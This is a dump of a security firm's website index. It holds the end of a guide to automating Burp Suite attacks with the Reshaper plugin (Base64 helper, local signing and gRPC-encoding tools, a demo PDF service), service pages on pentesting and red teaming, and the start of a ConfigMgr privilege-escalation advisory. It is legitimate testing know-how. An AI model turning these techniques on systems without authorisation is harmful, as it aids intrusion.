Script:\nvar Base64 = { // private property _keyStr : \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\u0026#34;, // public method for encoding encode : function (input) { var output = \u0026#34;\u0026#34;; var chr1, chr2, chr3, enc1, enc2, enc3, enc4; var i = 0; input = Base64._utf8_encode(input); while (i \u0026lt; input.length) { chr1 = input.charCodeAt(i++); chr2 = input.charCodeAt(i++); chr3 = input.charCodeAt(i++); enc1 = chr1 \u0026gt;\u0026gt; 2; enc2 = ((chr1 \u0026amp; 3) \u0026lt;\u0026lt; 4) | (chr2 \u0026gt;\u0026gt; 4); enc3 = ((chr2 \u0026amp; 15) \u0026lt;\u0026lt; 2) | (chr3 \u0026gt;\u0026gt; 6); enc4 = chr3 \u0026amp; 63; if (isNaN(chr2)) { enc3 = enc4 = 64; } else if (isNaN(chr3)) { enc4 = 64; } output = output + this._keyStr.charAt(enc1) + this._keyStr.charAt(enc2) + this._keyStr.charAt(enc3) + this._keyStr.charAt(enc4); } return output; }, // public method for decoding decode : function (input) { var output = \u0026#34;\u0026#34;; var chr1, chr2, chr3; var enc1, enc2, enc3, enc4; var i = 0; input = input.replace(/[^A-Za-z0-9\\+\\/\\=]/g, \u0026#34;\u0026#34;); while (i \u0026lt; input.length) { enc1 = this._keyStr.indexOf(input.charAt(i++)); enc2 = this._keyStr.indexOf(input.charAt(i++)); enc3 = this._keyStr.indexOf(input.charAt(i++)); enc4 = this._keyStr.indexOf(input.charAt(i++)); chr1 = (enc1 \u0026lt;\u0026lt; 2) | (enc2 \u0026gt;\u0026gt; 4); chr2 = ((enc2 \u0026amp; 15) \u0026lt;\u0026lt; 4) | (enc3 \u0026gt;\u0026gt; 2); chr3 = ((enc3 \u0026amp; 3) \u0026lt;\u0026lt; 6) | enc4; output = output + String.fromCharCode(chr1); if (enc3 != 64) { output = output + String.fromCharCode(chr2); } if (enc4 != 64) { output = output + String.fromCharCode(chr3); } } output = Base64._utf8_decode(output); return output; }, // private method for UTF-8 encoding _utf8_encode : function (string) { string = string.replace(/\\r\\n/g,\u0026#34;\\n\u0026#34;); var utftext = \u0026#34;\u0026#34;; for (var n = 0; n \u0026lt; string.length; n++) { var c = string.charCodeAt(n); if (c \u0026lt; 128) { utftext += String.fromCharCode(c); } else if((c \u0026gt; 127) \u0026amp;\u0026amp; (c \u0026lt; 2048)) { utftext += String.fromCharCode((c \u0026gt;\u0026gt; 6) | 192); utftext += String.fromCharCode((c \u0026amp; 63) | 128); } else { utftext += String.fromCharCode((c \u0026gt;\u0026gt; 12) | 224); utftext += String.fromCharCode(((c \u0026gt;\u0026gt; 6) \u0026amp; 63) | 128); utftext += String.fromCharCode((c \u0026amp; 63) | 128); } } return utftext; }, // private method for UTF-8 decoding _utf8_decode : function (utftext) { var string = \u0026#34;\u0026#34;; var i = 0; var c = c1 = c2 = 0; while ( i \u0026lt; utftext.length ) { c = utftext.charCodeAt(i); if (c \u0026lt; 128) { string += String.fromCharCode(c); i++; } else if((c \u0026gt; 191) \u0026amp;\u0026amp; (c \u0026lt; 224)) { c2 = utftext.charCodeAt(i+1); string += String.fromCharCode(((c \u0026amp; 31) \u0026lt;\u0026lt; 6) | (c2 \u0026amp; 63)); i += 2; } else { c2 = utftext.charCodeAt(i+1); c3 = utftext.charCodeAt(i+2); string += String.fromCharCode(((c \u0026amp; 15) \u0026lt;\u0026lt; 12) | ((c2 \u0026amp; 63) \u0026lt;\u0026lt; 6) | (c3 \u0026amp; 63)); i += 3; } } return string; } } var snus = Base64.encode(Reshaper.variables.getGlobalVariable(\u0026#34;name_input\u0026#34;)); Reshaper.event.runThen(\u0026#34;SetVariable\u0026#34;, { text: snus, useMessageValue: false, targetSource: \u0026#34;Global\u0026#34;, variableName: \u0026#34;name_input_base64\u0026#34; } ); The reason for base64 encoding our data before sending it to a console is because many Burp payloads may include single our double quotes which can escape our terminal command and we end up command injecting ourselves instead of the server.\nNext we use Run Process to drop our name_input_base64 variable to our python3 tool called signer.py.\nRequest Direction Thens Command Stdin Wait for completion Capture Output Capture Variable Name N/A Run Process python3 /home/user/tricky-apis/node-api-sign/signer.py {{g:name_input_base64}} Checked Checked signature If everything is followed correctly 3 variables will be created in the Global Variables tab:\nNext up we will use the Set value action the replace our form-urlencode parameters:\nRequest Direction Thens Source Text Source Type Value Destination Message Value Destination Value Type Destination Identifier Placement Destination Value Path N/A Set Value {{g:name_input}} Text Request Body Params N/A name N/A Set Value {{g:signature}} Text Request Body Params N/A signature Very nice. However, when we test run our setup everything works correctly with repeater but never with intruder. Don\u0026rsquo;t forget to activate Intruder at Capture Traffic From under settings:\nAlso remember to set the maximum concurrent requests in the Intruder resource pool to 1. The setup we have created is quite CPU intensive and will not handle concurrency.\nBut on the other hand - it\u0026rsquo;s automagic :)\nScenario 6 - Using Burp and Reshaper to perform multiple request and save PDF to disk Who doesn\u0026rsquo;t love a good PDF generator? We at Shelltrail certainly do. However sometimes multiple steps is needed to provide the content that later will be used in the generated PDF.\nTo simulate this we run the following node.js application:\n// mkdir $HOME/node-api-pdf // cd $HOME/node-api-pdf // npm init -y // npm install express body-parser puppeteer const express = require(\u0026#39;express\u0026#39;); const bodyParser = require(\u0026#39;body-parser\u0026#39;); const puppeteer = require(\u0026#39;puppeteer\u0026#39;); const app = express(); const port = 3000; // In-memory storage for HTML let storedHTML = \u0026#39;\u0026#39;; // Middleware to check API key const apiKeyMiddleware = (req, res, next) =\u0026gt; { const apiKey = req.headers[\u0026#39;api-key\u0026#39;]; if (apiKey !== \u0026#39;1d8e71ab-8e46-47aa-b25c-a3c8c83b0360\u0026#39;) { return res.status(403).json({ message: \u0026#39;Forbidden: Incorrect API key\u0026#39; }); } next(); }; app.use(bodyParser.text({ type: \u0026#39;text/html\u0026#39; })); // Insert endpoint app.post(\u0026#39;/insert\u0026#39;, apiKeyMiddleware, (req, res) =\u0026gt; { storedHTML = req.body; // Store HTML content in memory res.status(200).json({ message: \u0026#39;HTML content stored successfully\u0026#39; }); }); // Generate endpoint app.get(\u0026#39;/generate\u0026#39;, apiKeyMiddleware, async (req, res) =\u0026gt; { if (!storedHTML) { return res.status(404).json({ message: \u0026#39;No HTML content found to generate PDF\u0026#39; }); } const browser = await puppeteer.launch(); const page = await browser.newPage(); await page.setContent(storedHTML, { waitUntil: \u0026#39;networkidle0\u0026#39; }); const pdfBuffer = await page.pdf({ format: \u0026#39;A4\u0026#39; }); await browser.close(); res.contentType(\u0026#39;application/pdf\u0026#39;); res.send(pdfBuffer); }); app.listen(port, () =\u0026gt; { console.log(`Server running on http://localhost:${port}`); }); The application has two endpoints, /insert and /generate. The /insert takes user supplied input via a POST body and stores in memory and returns a UUID representing the content. The input should be in HTML. Upon performing a GET request to /generate/\u0026lt;UUID\u0026gt; the HTML content will be converted to a PDF. Both endpoint requires an API key.\nStoring the HTML content:\n$ curl -X POST http://localhost:3000/insert \\ -H \u0026#39;Content-Type: text/html\u0026#39; \\ -H \u0026#39;API-Key: 1d8e71ab-8e46-47aa-b25c-a3c8c83b0360\u0026#39; \\ -d \u0026#39;\u0026lt;html\u0026gt;\u0026lt;body\u0026gt;\u0026lt;h1\u0026gt;Hello, World!\u0026lt;/h1\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u0026#39; {\u0026#34;uuid\u0026#34;:\u0026#34;5d164279-4515-4db6-b620-976c2b56431d\u0026#34;} Generating the PDF:\n$ curl http://localhost:3000/generate/5d164279-4515-4db6-b620-976c2b56431d -H \u0026#39;API-Key: 1d8e71ab-8e46-47aa-b25c-a3c8c83b0360\u0026#39; -o output.pdf % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 14408 100 14408 0 0 9232 0 0:00:01 0:00:01 --:--:-- 9229 $ file output.pdf output.pdf: PDF document, version 1.4, 1 page(s) Great success. Everything seems to work as expected.\nLets plan our setup:\nSet the API key named api_key as variable in Reshaper Create a Whens action to trigger on POST to /input Store the UUID in a variable named uuid returned from the /input action. Build a HTTP GET request which uses the UUID variable and API key to generate the PDF Send the crafted HTTP request Save the generate PDF to disk Task 1 - Set the API key named api_key as variable in Reshaper:\nTask 2 - Create a Whens action to trigger on POST to /input:\nRequest Direction Whens Source Message Value Source Value Type Match Type Match Text Response Matches Text Request Status Line Text Equals POST /insert HTTP/1.1 (Note: The Request direction shall be Response even though our POST action is a Request.)\nTask 3 - Store the returned UUID in a variable named uuid from the /input endpoint:\nRequest Direction Thens Source Message Value Source Value Type Source Value Path Destination Variable Source Destination Variable Name Destination Value Type N/A Set Variable Response Body JSON uuid Global uuid Text Task 4 - Build a HTTP GET request which uses the UUID variable and API key to generate the PDF:\nNow we need to use a new action type called Build HTTP Message.\nRequest Direction Thens Event Direction Starter HTTP message Setter (1) - Source Text Destination Message Value Destination Identifier Placement Setter (2) Source Text Destination Message Value Destination Identifier Destination Identifier Placement Destination Variable Source Destination Variable Name N/A Build HTTP Message Request GET /generate/{{g:uuid}} HTTP/1.1 {{g:api_key}} Request Header API-Key Only localhost:3000 Request Header Host Only Global http_message Now this is really cool. If we trigger this Reshaper rule by sending a POST request to /insert to get an UUID response, Reshaper crafts a fully functional HTTP request and store in a variable called http_message:\nTask 5 - Send the crafted HTTP request:\nRequest Direction Thens Request URL Protocol Address Port Wait for Completion N/A Send Request {{g:http_message}} Checked Task 6 - Save the generate PDF to disk:\nWe store every PDF on disk because we want to manually inspect them to not miss any potential vulnerabilities.\nTo achieve this We create a new Reshaper HTTP rule that will match on the HTTP response header Content-Type: application/pdf:\nRequest Direction Whens Source Message Value Source Identifier Identifies Placement Source Value Type Match Type Match Text Response Matches Text Response Header Content-Type Last Text Equals application-pdf We set the response body (a.k.a the PDF file) to a variable named pdf\nRequest Direction Thens Source Message Value Source Value Type Destination Variable Source Destination Variable Name Destination Value Type N/A Set Variable Response Body Text Global pdf Text And then save that variable to disk at the location /tmp/pdf/\u0026lt;UUID\u0026gt;.pdf:\nRequest Direction Thens File Path Text Encoding File Exist Action N/A Save File /tmp/pdf/{{g:uuid}}.pdf {{g:pdf}} Default Overwrite From now on every request that is sent to /insert will save a PDF to the /tmp/pdf location where inspection of content can be made.\n$ file /tmp/pdf/* /tmp/pdf/05b053d5-e232-449f-b2d2-0c4338d8a2f6.pdf: PDF document, version 1.4, 1 page(s) /tmp/pdf/3e674c45-369e-4b04-8409-f90539a50eb3.pdf: PDF document, version 1.4, 1 page(s) /tmp/pdf/7fb8bbc0-91fd-4141-ba2a-090419364e5d.pdf: PDF document, version 1.4, 1 page(s) /tmp/pdf/812b488a-ecc1-4e8d-b8ef-b2dd105c181a.pdf: PDF document, version 1.4, 1 page(s) /tmp/pdf/88ce6b32-26ca-46f8-ad43-e77a8f679098.pdf: PDF document, version 1.4, 1 page(s) /tmp/pdf/c5c94988-d980-49d4-ba48-1d20ed5e877c.pdf: PDF document, version 1.4, 1 page(s) /tmp/pdf/ec410dc7-6937-45bb-ba58-37ab85566297.pdf: PDF document, version 1.4, 1 page(s) /tmp/pdf/f9c0101f-c510-49d6-be47-da2fb382206b.pdf: PDF document, version 1.4, 1 page(s) Scenario 7 - gRPC from the abyss gRPC is a tricky protocol which makes automatic scanning and testing hard as it is using protobuf and serializes its messages. @nxenon has performed in-depth research and provides tooling for encoding and decoding these protobuf messages.\nWe\u0026rsquo;ll build on top of that research and implement an automatic encoder that can be used with Burps active scanner and repeater.\nUse nxenon\u0026rsquo;s echo gRPC lab to spin up an demo environment which will be used to demonstrate Reshapers abilities.\nWhen the environment is live requests and responses will look like this:\nLets configure our Reshaper HTTP rules as following:\nRequest Direction Whens Source Message Value Source Value Type Match Type Match Text Response Matches Text URL Text Equals http://localhost:8080/grpc.gateway.testing.EchoService/Echo We\u0026rsquo;ll set the request body to a variable:\nRequest Direction Thens Source Message Value Source Value Type Destination Variable Source Destination Variable Name Destination Value Type N/A Set Variable Request Body Text Global grpc Text We once again use our base64 encoder technique to encode our data before dropping it to our command-line tooling.\nRun Script:\nvar Base64 = { // private property _keyStr : \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\u0026#34;, // public method for encoding encode : function (input) { var output = \u0026#34;\u0026#34;; var chr1, chr2, chr3, enc1, enc2, enc3, enc4; var i = 0; input = Base64._utf8_encode(input); while (i \u0026lt; input.length) { chr1 = input.charCodeAt(i++); chr2 = input.charCodeAt(i++); chr3 = input.charCodeAt(i++); enc1 = chr1 \u0026gt;\u0026gt; 2; enc2 = ((chr1 \u0026amp; 3) \u0026lt;\u0026lt; 4) | (chr2 \u0026gt;\u0026gt; 4); enc3 = ((chr2 \u0026amp; 15) \u0026lt;\u0026lt; 2) | (chr3 \u0026gt;\u0026gt; 6); enc4 = chr3 \u0026amp; 63; if (isNaN(chr2)) { enc3 = enc4 = 64; } else if (isNaN(chr3)) { enc4 = 64; } output = output + this._keyStr.charAt(enc1) + this._keyStr.charAt(enc2) + this._keyStr.charAt(enc3) + this._keyStr.charAt(enc4); } return output; }, // public method for decoding decode : function (input) { var output = \u0026#34;\u0026#34;; var chr1, chr2, chr3; var enc1, enc2, enc3, enc4; var i = 0; input = input.replace(/[^A-Za-z0-9\\+\\/\\=]/g, \u0026#34;\u0026#34;); while (i \u0026lt; input.length) { enc1 = this._keyStr.indexOf(input.charAt(i++)); enc2 = this._keyStr.indexOf(input.charAt(i++)); enc3 = this._keyStr.indexOf(input.charAt(i++)); enc4 = this._keyStr.indexOf(input.charAt(i++)); chr1 = (enc1 \u0026lt;\u0026lt; 2) | (enc2 \u0026gt;\u0026gt; 4); chr2 = ((enc2 \u0026amp; 15) \u0026lt;\u0026lt; 4) | (enc3 \u0026gt;\u0026gt; 2); chr3 = ((enc3 \u0026amp; 3) \u0026lt;\u0026lt; 6) | enc4; output = output + String.fromCharCode(chr1); if (enc3 != 64) { output = output + String.fromCharCode(chr2); } if (enc4 != 64) { output = output + String.fromCharCode(chr3); } } output = Base64._utf8_decode(output); return output; }, // private method for UTF-8 encoding _utf8_encode : function (string) { string = string.replace(/\\r\\n/g,\u0026#34;\\n\u0026#34;); var utftext = \u0026#34;\u0026#34;; for (var n = 0; n \u0026lt; string.length; n++) { var c = string.charCodeAt(n); if (c \u0026lt; 128) { utftext += String.fromCharCode(c); } else if((c \u0026gt; 127) \u0026amp;\u0026amp; (c \u0026lt; 2048)) { utftext += String.fromCharCode((c \u0026gt;\u0026gt; 6) | 192); utftext += String.fromCharCode((c \u0026amp; 63) | 128); } else { utftext += String.fromCharCode((c \u0026gt;\u0026gt; 12) | 224); utftext += String.fromCharCode(((c \u0026gt;\u0026gt; 6) \u0026amp; 63) | 128); utftext += String.fromCharCode((c \u0026amp; 63) | 128); } } return utftext; }, // private method for UTF-8 decoding _utf8_decode : function (utftext) { var string = \u0026#34;\u0026#34;; var i = 0; var c = c1 = c2 = 0; while ( i \u0026lt; utftext.length ) { c = utftext.charCodeAt(i); if (c \u0026lt; 128) { string += String.fromCharCode(c); i++; } else if((c \u0026gt; 191) \u0026amp;\u0026amp; (c \u0026lt; 224)) { c2 = utftext.charCodeAt(i+1); string += String.fromCharCode(((c \u0026amp; 31) \u0026lt;\u0026lt; 6) | (c2 \u0026amp; 63)); i += 2; } else { c2 = utftext.charCodeAt(i+1); c3 = utftext.charCodeAt(i+2); string += String.fromCharCode(((c \u0026amp; 15) \u0026lt;\u0026lt; 12) | ((c2 \u0026amp; 63) \u0026lt;\u0026lt; 6) | (c3 \u0026amp; 63)); i += 3; } } return string; } } var snus = Base64.encode(Reshaper.variables.getGlobalVariable(\u0026#34;grpc\u0026#34;)); Reshaper.event.runThen(\u0026#34;SetVariable\u0026#34;, { text: snus, useMessageValue: false, targetSource: \u0026#34;Global\u0026#34;, variableName: \u0026#34;grpc_base64\u0026#34; } ); Now we send our payload stored in the grpc_base64 variable to nxenon\u0026rsquo;s grpc-coder.py tool:\nRequest Direction Thens Command Stdin Wait for completion Capture Output Capture Variable Name N/A Run Process echo $(echo {{g:grpc_base64}} | base64 -d) | protoscope -s | python3 /home/user/grpc-coder.py \u0026ndash;encode | tr -d \u0026lsquo;\\n\u0026rsquo; Checked Checked grpc_payload Next we replace our request body with the gRPC encoded payload:\nRequest Direction Thens Source Text Source Type Value Destination Message Value Destination Value Type N/A Set Value {{g:grpc_payload}} Text Request Body Text Awesome. Now we can grab a valid request that has been sent to the server, use the grpc-coder.py to decode the input, then we can use Burps active scanner or manually customize the input as we please and all encoding will be done automatically.\nThis will save us precious time when assessing gRPC Web applications.\nSummary Reshaper is an extremely powerful Burp plugin that helps you automate complex flows or overcome hurdles when assessing advanced web applications. It\u0026rsquo;s been a long way to reach the end of this research but if you are here you most certainly learned a thing or two regarding the many possibilities with Burp and Reshaper which may help you when pentesting web applications.\nAll the code from all node.js applications can be found at Shelltrails github page,\nTake care and happy hacking!\n","date":1713744000,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1756166400,"objectID":"cbb5a133083d9a5a01ee979b026cea95","permalink":"https://www.shelltrail.com/research/reshaper-the-guide-to-ultimate-burp-plugin-for-advanced-shenanigans/","publishdate":"2024-04-22T00:00:00Z","relpermalink":"/research/reshaper-the-guide-to-ultimate-burp-plugin-for-advanced-shenanigans/","section":"research","summary":"Have you ever had issues with CSRF tokens during a web assessment? Or drop data from burp to commandline for parsing? This is the guide to leverage the power of the Reshaper plugin developed by @ddwightx","tags":null,"title":"Reshaper - The guide to the ultimate Burp plugin for advanced shenanigans","type":"research"},{"authors":null,"categories":null,"content":"More and more companies are choosing to place their services with public cloud providers. There can be many reasons, but the most common is that it is easy to get started with, it simplifies scalability and operational reliability.\nThe cloud provider is responsible for the overall IT security according to their Shared Responsibility Model, and it is up to the administrator to what areas are under their care. It is in the latter case that it can be valuable to perform a cloud security audit by having a security provider like Shelltrail to assist with the expertise.\nHow is a cloud security audit conducted? The most common starting point for a cloud security audit is to examine the resources in the cloud environment through a Read-only or Security Audit account and analyze the security posture of the infrastructure.\nSome of the areas reviewed in a cloud security audit include:\nPermission assignments Management of privileged accounts Exposed resources Best practices Segmentation Data encryption Shelltrail\u0026rsquo;s security testers have several years of experience in reviewing the major cloud providers on the market, and with certifications issued by both Amazon AWS and Microsoft Azure, Shelltrail also has proven knowledge within the domain.\nUsually, an analysis of the cloud environment is included during a web application test when it is deployed in a public cloud environment. The reason for the combination of web and cloud auditing is that it provides more in-depth protection. Typically, the test takes a couple of days to perform, but this depends on the size of the cloud infrastructure.\nShelltrail\u0026rsquo;s habit of working with different cloud providers means that we have the experience to perform tests and follow each cloud provider\u0026rsquo;s Rules of Engagement for security audits.\nWhy should the cloud environment be audited? The so-called Shared Responsibility Model among the different cloud providers, for instance at Microsoft Azure and Amazon AWS explains that the responsibility for certain security aspects lies with the administrator, depending on the type of deployment (SaaS, PaaS, IaaS).\nAdditional reasons might include: requirements from customers or suppliers, customer trust and reputation, regulatory requirements (GDPR, PCI DSS, ISO 27001) or verification of the current security posture.\nUpon completion of the assignment At the completion of the assignment, a debriefing takes place where Shelltrail\u0026rsquo;s security experts go through the entire report, which includes a full presentation of all security issues. The report begins with a high-level summary where the emphasis on risks is prioritized over technical analyses. Normally, within a few days after the completion of the assignment, the report is delivered in its final format.\n","date":1698624000,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1699488000,"objectID":"82730262762153e919f39cb8ae0a6b67","permalink":"https://www.shelltrail.com/cyber-security-services/cloud-security-assessment/","publishdate":"2023-10-30T00:00:00Z","relpermalink":"/cyber-security-services/cloud-security-assessment/","section":"cyber-security-services","summary":"A cloud security assessment involves evaluating the configuration, access controls, data protection measures, and overall security of an organization's cloud-based resources to ensure the safe and compliant use of cloud services.","tags":["Cloud security assessment","Pentest AWS","Pentest","Pentest Azure","Azure"],"title":"Cloud security assessment","type":"cyber-security-services"},{"authors":null,"categories":null,"content":"When was the last time your company performed an inventory and review of all internet-exposed systems? This is a good question to seek an answer to when you want to assess the risk of your internet presence. Systems become obsolete, and new vulnerabilities are discovered daily, which means companies must be diligent in inventorying their systems, which ports are exposed, which versions of different software are running, and map these against vulnerabilities that pose a real threat.\nIt is a challenging task that must be iterated at regular basis and is not always in line with the company\u0026rsquo;s prioritized goals. A common reason is a Don\u0026rsquo;t fix it if it ain\u0026rsquo;t broken a attitude in combination with prioritization of scale an growth which may leave internet-exposed system vulnerable to attacks.\nWhat does a pentest of external infrastructure entail? The assignment usually begins with the client providing a list of IP addresses and domain names to be reviewed. In addition to this, Shelltrail uses Open Source Intelligence sources (OSINT) to try to find more systems that may be undocumented or classified as Shadow IT.\nOnce the list of identified systems is deemed complete, it is verified that all targets are under the client\u0026rsquo;s security responsibility and not third-party systems. If third-party systems are involved, written approval regarding the security audit of the third-party must be submitted to Shelltrail\u0026rsquo;s security consultants.\nWith a complete list of legitimate targets, the testing begins where a combination of automated and manual security audits of the systems is performed. Here, techniques from all of Shelltrail\u0026rsquo;s areas of expertise are combined, such as security reviews of web applications, Windows and Linux attacks, binary exploitation, and cloud-specific attacks, to name a few.\nShelltrail\u0026rsquo;s security experts possess a broad background in cybersecurity audits, which serves well for the varied services that can be exposed on the internet.\nWhy and when should an external infrastructure review be performed? As previously mentioned, new vulnerabilities are discovered daily and systems become End-of-Life, sometimes leading to the manufacturer ceasing to maintain systems with security updates. This makes it important to periodically conduct a review of internet-exposed systems to secure them before attackers find the system. Regardless of whether your company produces garden hoses or develops pharmaceuticals, your internet-exposed systems may become a target for opportunistic attackers scanning the internet.\nThe Result The assignment results in a professional report where all security issues are described in a detail. The vulnerabilities described in the report are ranked from critical to low, and in combination with the client\u0026rsquo;s perceived risks, the report can be used as a priority list in which order to address the problems. It is not uncommon for the report to be used to increase the security budget for a company or to inform, for example, management that security must be prioritized.\n","date":1698624000,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1699488000,"objectID":"7628a21ad5883fd587b70cb0080c88b9","permalink":"https://www.shelltrail.com/cyber-security-services/external-infrastructure/","publishdate":"2023-10-30T00:00:00Z","relpermalink":"/cyber-security-services/external-infrastructure/","section":"cyber-security-services","summary":"An external infrastructure security assessment involves analyzing an organization's network, systems, and online presence from an external perspective to identify and mitigate vulnerabilities that could be exploited by external attackers.","tags":["External network penetration test","Attack surface","Pentest"],"title":"External infrastructure","type":"cyber-security-services"},{"authors":null,"categories":null,"content":"An internal security assessment, which is commonly performed together with an assessment of the Active Directory environment, is a common way to evaluate an organizations defense-in-depth against an attacker. A common misconception is that the protection provided by perimeter defenses are sufficient to effectively stop and outside attacker, however this is rarely the case as credential leakage/guessing, phishing, the use of zero-day vulnerabilities and social engineering are all attacks that could aid an attacker in breaching the perimeter defenses.\nWhat is an internal pentest? A penetration test of the internal systems are commonly performed as what is called an \u0026ldquo;Assume Breach\u0026rdquo;-scenario, where the test simulates that a resource such as a workstation on the internal network has been compromised by an attacker. A test is typically conducted during 2 weeks (for an average-sized environment), even if the time allocation can vary depending on the scope of the test and which initial access methodology is chosen.\nIn the most common scenario, \u0026ldquo;Assume Breach\u0026rdquo;, Shelltrails security experts will assess the internal environment such as web applications, internal servers and services as well as the Active Directory in order to elevate privileges and move laterally to additional targets. The goal of the assessment is to detect vulnerabilities that after mitigation, will improve the company\u0026rsquo;s resilience during an attack. Additional targets may also be chosen such as finding and compromising backup-servers, hypervisors or gaining access to highly privileged accounts.\nThe pentest contains several parts and systems, including (but not limited to):\nInternal web applications Access Control Lists in the AD environment Configuration servers such as SCCM/MECM/ConfigMgr Certificate Services (AD CS) SQL servers Why and when should we pentest our internal services? The goal of a pentest is to increase the resilience of the internal network against a threat with limited access, by uncovering the paths the attacker may take to move laterally or elevate privileges. By identifying weak points, and reducing or removing their exploitability, the security posture of the entire network is strengthened.\nWe recommend all organizations with medium to large internal environments to conduct internal security assessments on a yearly basis, as new tools, techniques and attacks are constantly introduced.\nThe result of an internal pentest An internal pentest concludes with a de-briefing meeting and a report summarizing the identified vulnerabilities, how they are exploited as well as how they can be fixed or mitigated.\n","date":1698624000,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1699488000,"objectID":"e9058bc4dcb46c2fe0dd883b902b2684","permalink":"https://www.shelltrail.com/cyber-security-services/internal-and-active-directory-penetration-test/","publishdate":"2023-10-30T00:00:00Z","relpermalink":"/cyber-security-services/internal-and-active-directory-penetration-test/","section":"cyber-security-services","summary":"An internal infrastructure security assessment encompasses evaluating an organization's network, systems, and resources from within to detect potential vulnerabilities and ensure the protection of sensitive data against insider threats and unauthorized access.","tags":["Internal network penetration test","Active Directory penetration test"],"title":"Internal/Active Directory penetration test","type":"cyber-security-services"},{"authors":null,"categories":null,"content":"A Red Team-engagement is a simulated attack on an organization from a holistic view that can include several different parts, such as phishing, social engineering, attacks against externally exposed infrastructure as well as internal systems. The simulation is intended to be similar to a real-world attack, using the same Tools, Techniques and Procedures (TTPs) used by real attackers (and often based on the specific threat actors of the targeted business sector).\nWhat is a Red Team engagement? Red Team engagement are often confused with the closely related term penetration testing, but differs greatly in a number of areas. While both deal with the identification and exploitation of vulnerabilities they have different methodology, goals, purpose and execution. While a pentest aims at identifying as many vulnerabilities as possible in a network or system, a Red Team engagement aim to assess an entire organizations resilience against a targeted attack with one or more specific goals.\nThe goal of a Red Team engagement can be, for instance to access specific sensitive information, a certain mail account or the CEO\u0026rsquo;s user account in the Active Directory domain. This often means that the attacker can act more like a real threat, acting more stealthy as the goal is not to exploit vulnerabilities that may trigger certain alarms.\nDuring a Red Team engagement it is also common to only notify a select group of people that are aware the test is being conducted, so that the actions and reactions from the staff more closely resembles what would happen in a real-world scenario. By doing this, the organizational procedures can be evaluated and improved upon.\nWhy and when should a Red Team engagement be conducted? It is recommended to perform a Red Team engagement when the security posture of the internal network is mature and tools and procedures are in place to handle threats within the organization. As the aim is to evaluate how an entire organization handles an attack, there is little need for evaluation if the procedures are not in place.\nWhen the network has undergone an internal assessment, identified vulnerabilities fixed, procedures and monitoring are in place it would be a good time to conduct a Red Team engagement to verify that everything works as intended.\nBesides these occasions, some regulatory frameworks such as Threat Intelligence-based Ethical Red Teaming (TIBER) may require you to perform Red Team exercises.\nReporting and results The reporting of a Red Team engagement differs from that of a normal pentest, as the goals and approach to the test are different between the two test types. In this type of test, the reporting is focused around what\u0026rsquo;s called an attack narrative where the testers describes attacks performed, why the types of attack were used, what the expected reactions from the defending team was and what actually happened. As the goal is aimed at a specific target, all identified vulnerabilities may not be included, but rather the path chosen by the attackers at reaching the specified target. The report and de-briefing meeting also aims to identify improvements that have an overall impact on both a technical as well as on an organizational level.\n","date":1698624000,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1699488000,"objectID":"5734c9de4ee9610f0e009846f7199549","permalink":"https://www.shelltrail.com/cyber-security-services/red-team-engagement/","publishdate":"2023-10-30T00:00:00Z","relpermalink":"/cyber-security-services/red-team-engagement/","section":"cyber-security-services","summary":"A Red Team security engagement involves simulating real-world cyberattacks on an organization's systems and infrastructure to identify vulnerabilities, test defensive capabilities, and improve overall security posture.","tags":["Red Team","Adversial simulation","Attack simulation","OSCE3","OSEP"],"title":"Red Team engagement","type":"cyber-security-services"},{"authors":null,"categories":null,"content":"Web applications in all its forms are often categorized as critical systems for organizations, whether being the organizations own internet exposed services, SaaS-solutions, products or internal systems. Web applications are often complex solutions with lots of functionality and thus constitute a large (often internet-exposed) attack surface. With these characteristics it is paramount to conduct security assessments to ensure the security of the application on a regular basis.\nWhat is a web application security assessment/pentest? A web application pentest is an assessment of the security of a web application conducted by seasoned security experts where the testers try to uncover security issues by hacking the web application in the same manner and with the same tools as real-world attackers would. The uncovered vulnerabilities can later be fixed or mitigated using the recommendations given by the pentesters, thereby strengthening the security of the application.\nThe security assessment is conducted to uncover vulnerabilities that are covered in standards such as OWASP Top 10 and OWASP Testing Guide, but is not only limited to these, as it is not uncommon to find logical issues and other issues which are related to the organizations sector as well. The tests are tailored to match the risks identified by the target organization, and identifying vulnerabilities that could lead to those risks, in order to minimize them.\nWhy and when should you conduct a security assessment? There are a number of reasons why a web application security assessment should be conducted, some of which are:\nApplications are business critical and should be better protected Upon procuring or integrating third-party components it is common to perform due-diligence or to assess the integration effort to ensure no new vulnerabilities have been introduced. Customers regularly want to be ensured that security assessments have been performed on products Rules and regulatory frameworks (such as PCI-DSS) require or recommend that a pentest of the application has been performed. Results A common web application pentest is conducted during a period of 1-2 weeks and result in a report and a de-briefing meeting, where all details about the identified vulnerabilities are discussed and how these can be remedied.\nShelltrail\u0026rsquo;s security experts have experience from hundreds of security assessments of web applications and have some of the highest certifications in the industry when it comes to offensive security in web applications.\n","date":1698624000,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1699488000,"objectID":"27004b62e7ff5903903065b17a19688a","permalink":"https://www.shelltrail.com/cyber-security-services/web-security-assessment/","publishdate":"2023-10-30T00:00:00Z","relpermalink":"/cyber-security-services/web-security-assessment/","section":"cyber-security-services","summary":"Web application security assessment involves evaluating and identifying vulnerabilities and weaknesses within a web application to ensure its protection against unauthorized access, data breaches, and cyber threats.","tags":["Web security assessment","Web application security","OWASP","OSWE"],"title":"Web assessment","type":"cyber-security-services"},{"authors":null,"categories":null,"content":"TL;DR ConfigMgr WebService, a third-party extension used to simplify custom Operating System Deployment (OSD) for Microsoft Configuration Manager adds features to interact with Configuration Manager, MDT and Active Directory which under certain situations can be exploited to escalate privileges in an Active Directory domain. While the extension is considered legacy by the developer, it may still be prevalent in several environments.\nBackground As part of the research surrounding Microsoft Configuration Manager, Shelltrail has investigated a open source third-party tool used in OS deployments which interacts with Configuration Manager, MDT and Active Directory. The tool in question contains two parts, a WebService endpoint called ConfigMgr WebService and a .NET GUI application named ConfigMgr OSD FrontEnd.\nThe tools adds the functionality to create custom 